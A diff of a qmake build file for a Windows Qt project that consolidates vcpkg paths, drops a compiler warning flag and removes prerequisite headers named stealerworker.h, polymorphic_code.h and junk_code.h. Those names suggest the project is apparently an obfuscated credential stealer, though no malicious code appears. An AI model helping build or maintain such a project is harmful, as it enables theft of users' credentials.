@@ -30,18 +30,12 @@ RC_FILE = ../icon.rc
 INCLUDEPATH += \
     ../src \
     . \
-    C:/vcpkg/packages/openssl_x64-mingw-dynamic/include \
-    C:/vcpkg/packages/sqlite3_x64-mingw-dynamic/include \
-    C:/vcpkg/packages/libzip_x64-mingw-dynamic/include \
-    C:/vcpkg/packages/curl_x64-mingw-dynamic/include \
+    C:/vcpkg/installed/x64-mingw-dynamic/include \
     C:/Qt/6.5.3/mingw_64/include
 
 # Библиотеки для линковки
 LIBS += \
-    -LC:/vcpkg/packages/openssl_x64-mingw-dynamic/lib \
-    -LC:/vcpkg/packages/sqlite3_x64-mingw-dynamic/lib \
-    -LC:/vcpkg/packages/libzip_x64-mingw-dynamic/lib \
-    -LC:/vcpkg/packages/curl_x64-mingw-dynamic/lib \
+    -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
     -LC:/Qt/6.5.3/mingw_64/lib \
     -lsqlite3 \
     -lcurl \
@@ -62,7 +56,6 @@ LIBS += \
 QMAKE_CXXFLAGS += \
     -Wall \
     -Wextra \
-    -Werror=return-type \
     -DUNICODE \
     -D_WIN32 \
     -DMINGW_HAS_SECURE_API=1
@@ -103,11 +96,3 @@ win32 {
             debug/ui_*.h
     }
 }
-
-# Зависимости перед сборкой
-PRE_TARGETDEPS += \
-    ../src/build_key.h \
-    ../src/polymorphic_code.h \
-    ../src/junk_code.h \
-    ../src/stealerworker.h \
-    release/ui_mainwindow.h
